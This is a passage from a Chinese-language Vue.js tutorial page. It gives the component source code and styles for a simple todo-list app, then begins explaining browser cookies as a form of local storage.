class="hljs-selector-class">.btn</span> &#123;<span class="hljs-attribute">display</span>: inline-block;<span class="hljs-attribute">padding</span>: <span class="hljs-number">4px</span> <span class="hljs-number">12px</span>;<span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">0</span>;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">20px</span>;<span class="hljs-attribute">text-align</span>: center;<span class="hljs-attribute">vertical-align</span>: middle;<span class="hljs-attribute">cursor</span>: pointer;</span><br><span class="language-css">    <span class="hljs-attribute">box-shadow</span>: inset <span class="hljs-number">0</span> <span class="hljs-number">1px</span> <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.2</span>), <span class="hljs-number">0</span> <span class="hljs-number">1px</span> <span class="hljs-number">2px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.05</span>);</span><br><span class="language-css">    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.btn-danger</span> &#123;<span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;<span class="hljs-attribute">background-color</span>: <span class="hljs-number">#da4f49</span>;<span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#bd362f</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.btn-danger</span><span class="hljs-selector-pseudo">:hover</span> &#123;<span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;<span class="hljs-attribute">background-color</span>: <span class="hljs-number">#bd362f</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.btn</span><span class="hljs-selector-pseudo">:focus</span> &#123;<span class="hljs-attribute">outline</span>: none;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.todo-container</span> &#123;<span class="hljs-attribute">width</span>: <span class="hljs-number">600px</span>;<span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.todo-container</span> <span class="hljs-selector-class">.todo-wrap</span> &#123;<span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;<span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br><br></code></pre></td></tr></table></figure><p>src&#x2F;components&#x2F;MyHeader.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-header&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;请输入你的任务名称，按回车键确认&quot;</span> </span><br><span class="hljs-tag">           <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;title&quot;</span> @<span class="hljs-attr">keyup.enter</span>=<span class="hljs-string">&quot;add&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> &#123;nanoid&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;nanoid&#x27;</span></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;MyHeader&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">props</span>:[<span class="hljs-string">&#x27;addTodo&#x27;</span>],<span class="hljs-comment">// 接收从App传递过来的addTodo</span></span><br><span class="language-javascript"><span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">// 收集用户输入的title</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-title function_">add</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-comment">// 校验数据</span></span><br><span class="language-javascript"><span class="hljs-keyword">if</span>(!<span class="hljs-variable language_">this</span>.<span class="hljs-property">title</span>.<span class="hljs-title function_">trim</span>()) <span class="hljs-keyword">return</span> <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;输入不能为空&#x27;</span>)</span><br><span class="language-javascript"><span class="hljs-comment">// 将用户的输入包装成一个todo对象</span></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> todoObj = &#123; <span class="hljs-attr">id</span>:<span class="hljs-title function_">nanoid</span>(), <span class="hljs-attr">title</span>:<span class="hljs-variable language_">this</span>.<span class="hljs-property">title</span>, <span class="hljs-attr">done</span>:<span class="hljs-literal">false</span> &#125;</span><br><span class="language-javascript"><span class="hljs-comment">// 通知App组件去添加一个todo对象</span></span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addTodo</span>(todoObj)</span><br><span class="language-javascript"><span class="hljs-comment">// 清空输入</span></span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.<span class="hljs-property">title</span> = <span class="hljs-string">&#x27;&#x27;</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-comment">/*header*/</span></span><br><span class="language-css"><span class="hljs-selector-class">.todo-header</span> <span class="hljs-selector-tag">input</span> &#123;<span class="hljs-attribute">width</span>: <span class="hljs-number">560px</span>;<span class="hljs-attribute">height</span>: <span class="hljs-number">28px</span>;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ccc</span>;<span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;<span class="hljs-attribute">padding</span>: <span class="hljs-number">4px</span> <span class="hljs-number">7px</span>;&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.todo-header</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:focus</span> &#123;<span class="hljs-attribute">outline</span>: none;<span class="hljs-attribute">border-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">82</span>, <span class="hljs-number">168</span>, <span class="hljs-number">236</span>, <span class="hljs-number">0.8</span>);</span><br><span class="language-css"><span class="hljs-attribute">box-shadow</span>: inset <span class="hljs-number">0</span> <span class="hljs-number">1px</span> <span class="hljs-number">1px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.075</span>), <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">8px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">82</span>, <span class="hljs-number">168</span>, <span class="hljs-number">236</span>, <span class="hljs-number">0.6</span>);&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>src&#x2F;components&#x2F;MyList.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-main&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">MyItem</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;todoObj in todos&quot;</span><span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;todoObj.id&quot;</span> </span><br><span class="hljs-tag">            <span class="hljs-attr">:todo</span>=<span class="hljs-string">&quot;todoObj&quot;</span> <span class="hljs-attr">:checkTodo</span>=<span class="hljs-string">&quot;checkTodo&quot;</span><span class="hljs-attr">:deleteTodo</span>=<span class="hljs-string">&quot;deleteTodo&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">MyItem</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./MyItem&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;MyList&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">components</span>:&#123;<span class="hljs-title class_">MyItem</span>&#125;,</span><br><span class="language-javascript">    <span class="hljs-comment">// 声明接收App传递的数据，其中todos是自己用的，checkTodo和deleteTodo是给子组件MyItem用的</span></span><br><span class="language-javascript">    <span class="hljs-attr">props</span>:[<span class="hljs-string">&#x27;todos&#x27;</span>,<span class="hljs-string">&#x27;checkTodo&#x27;</span>,<span class="hljs-string">&#x27;deleteTodo&#x27;</span>]</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-comment">/*main*/</span></span><br><span class="language-css">  <span class="hljs-selector-class">.todo-main</span> &#123;<span class="hljs-attribute">margin-left</span>: <span class="hljs-number">0px</span>;<span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;<span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2px</span>;<span class="hljs-attribute">padding</span>: <span class="hljs-number">0px</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.todo-empty</span> &#123;<span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;<span class="hljs-attribute">line-height</span>: <span class="hljs-number">40px</span>;<span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;</span><br><span class="language-css">    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2px</span>;<span class="hljs-attribute">padding-left</span>: <span class="hljs-number">5px</span>;<span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>;&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>src&#x2F;components&#x2F;MyItem.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- 如下代码也能实现功能，但是不太推荐，因为有点违反原则，因为修改了props --&gt;</span><br>      <span class="hljs-comment">&lt;!-- &lt;input type=&quot;checkbox&quot; v-model=&quot;todo.done&quot;/&gt; --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">:checked</span>=<span class="hljs-string">&quot;todo.done&quot;</span> @<span class="hljs-attr">change</span>=<span class="hljs-string">&quot;handleCheck(todo.id)&quot;</span>/&gt;</span>  <br>      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123; todo.title &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-danger&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;handleDelete(todo.id)&quot;</span>&gt;</span>删除<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;MyItem&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-comment">//声明接收todo、checkTodo、deleteTodo</span></span><br><span class="language-javascript">    <span class="hljs-attr">props</span>:[<span class="hljs-string">&#x27;todo&#x27;</span>,<span class="hljs-string">&#x27;checkTodo&#x27;</span>,<span class="hljs-string">&#x27;deleteTodo&#x27;</span>],</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-comment">// 勾选or取消勾选</span></span><br><span class="language-javascript">      <span class="hljs-title function_">handleCheck</span>(<span class="hljs-params">id</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">checkTodo</span>(id)<span class="hljs-comment">// 通知App组件将对应的todo对象的done值取反</span></span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">// 删除</span></span><br><span class="language-javascript">      <span class="hljs-title function_">handleDelete</span>(<span class="hljs-params">id</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">if</span>(<span class="hljs-title function_">confirm</span>(<span class="hljs-string">&#x27;确定删除吗？&#x27;</span>))&#123;</span><br><span class="language-javascript">          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">deleteTodo</span>(id)<span class="hljs-comment">// 通知App组件将对应的todo对象删除</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-comment">/*item*/</span></span><br><span class="language-css">  <span class="hljs-selector-tag">li</span> &#123;<span class="hljs-attribute">list-style</span>: none;<span class="hljs-attribute">height</span>: <span class="hljs-number">36px</span>;<span class="hljs-attribute">line-height</span>: <span class="hljs-number">36px</span>;<span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">5px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">label</span> &#123;<span class="hljs-attribute">float</span>: left;<span class="hljs-attribute">cursor</span>: pointer;&#125;</span><br><span class="language-css">  <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">label</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">input</span> &#123;<span class="hljs-attribute">vertical-align</span>:middle; <span class="hljs-attribute">margin-right</span>:<span class="hljs-number">6px</span>; <span class="hljs-attribute">position</span>:relative;<span class="hljs-attribute">top</span>: -<span class="hljs-number">1px</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">button</span> &#123;<span class="hljs-attribute">float</span>: right;<span class="hljs-attribute">display</span>: none;<span class="hljs-attribute">margin-top</span>: <span class="hljs-number">3px</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:before</span> &#123;<span class="hljs-attribute">content</span>: initial;&#125;</span><br><span class="language-css">  <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:last-child</span> &#123;<span class="hljs-attribute">border-bottom</span>: none;&#125;</span><br><span class="language-css">  <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:hover</span>&#123;<span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ddd</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:hover</span> <span class="hljs-selector-tag">button</span>&#123;<span class="hljs-attribute">display</span>: block;&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>src&#x2F;components&#x2F;MyFooter.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-footer&quot;</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;total&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- &lt;input type=&quot;checkbox&quot; :checked=&quot;isAll&quot; @change=&quot;checkAll&quot;/&gt; --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;isAll&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>已完成&#123;&#123; doneTotal &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> / 全部&#123;&#123; total &#125;&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-danger&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;clearAll&quot;</span>&gt;</span>清除已完成任务<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;MyFooter&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">props</span>:[<span class="hljs-string">&#x27;todos&#x27;</span>,<span class="hljs-string">&#x27;checkAllTodo&#x27;</span>,<span class="hljs-string">&#x27;clearAllTodo&#x27;</span>],</span><br><span class="language-javascript">    <span class="hljs-attr">computed</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-comment">// 总数</span></span><br><span class="language-javascript">      <span class="hljs-title function_">total</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-property">length</span></span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">// 已完成数</span></span><br><span class="language-javascript">      <span class="hljs-title function_">doneTotal</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-comment">//此处使用reduce方法做条件统计</span></span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">pre,todo</span>)=&gt;</span> pre + (todo.<span class="hljs-property">done</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) ,<span class="hljs-number">0</span>)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">// 控制全选框</span></span><br><span class="language-javascript">      <span class="hljs-attr">isAll</span>:&#123;</span><br><span class="language-javascript">        <span class="hljs-comment">//全选框是否勾选</span></span><br><span class="language-javascript">        <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">          <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">doneTotal</span> === <span class="hljs-variable language_">this</span>.<span class="hljs-property">total</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">total</span> &gt; <span class="hljs-number">0</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-comment">//isAll被修改时set被调用</span></span><br><span class="language-javascript">        <span class="hljs-title function_">set</span>(<span class="hljs-params">value</span>)&#123;</span><br><span class="language-javascript">          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">checkAllTodo</span>(value)</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-comment">/* checkAll(e)&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">this.checkAllTodo(e.target.checked)</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125; */</span></span><br><span class="language-javascript">      <span class="hljs-comment">//清空所有已完成</span></span><br><span class="language-javascript">      <span class="hljs-title function_">clearAll</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">clearAllTodo</span>()</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-comment">/*footer*/</span></span><br><span class="language-css">  <span class="hljs-selector-class">.todo-footer</span> &#123;<span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;<span class="hljs-attribute">line-height</span>: <span class="hljs-number">40px</span>;<span class="hljs-attribute">padding-left</span>: <span class="hljs-number">6px</span>;<span class="hljs-attribute">margin-top</span>: <span class="hljs-number">5px</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.todo-footer</span> <span class="hljs-selector-tag">label</span> &#123;<span class="hljs-attribute">display</span>: inline-block;<span class="hljs-attribute">margin-right</span>: <span class="hljs-number">20px</span>;<span class="hljs-attribute">cursor</span>: pointer;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.todo-footer</span> <span class="hljs-selector-tag">label</span> <span class="hljs-selector-tag">input</span> &#123;<span class="hljs-attribute">position</span>: relative;<span class="hljs-attribute">top</span>: -<span class="hljs-number">1px</span>;<span class="hljs-attribute">vertical-align</span>: middle;</span><br><span class="language-css">    <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">5px</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.todo-footer</span> <span class="hljs-selector-tag">button</span> &#123;<span class="hljs-attribute">float</span>: right;<span class="hljs-attribute">margin-top</span>: <span class="hljs-number">5px</span>;&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221117162252774.png" alt="image-20221117162252774"></p><h2 id="2-3-浏览器本地存储"><a href="#2-3-浏览器本地存储" class="headerlink" title="2.3 浏览器本地存储"></a>2.3 浏览器本地存储</h2><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>Cookie是最早被提出来的本地存储方式，在此之前，服务端是无法判断网络中的两个请求是否是同一用户发起的，为解决这个问题，Cookie就出现了。Cookie是存储在用户浏览器中的一段不超过 4 KB 的字符串。它由一个名称（Name）、一个值（Value）和其它几个用 于控制 Cookie有效期、安全性、使用范围的可选属性组成。不同域名下的 Cookie 各自独立，每当客户端发起请求时，会自动把当前域名下所有未过期的 Cookie一同发送到服务器。</p><p><strong>Cookie的特性 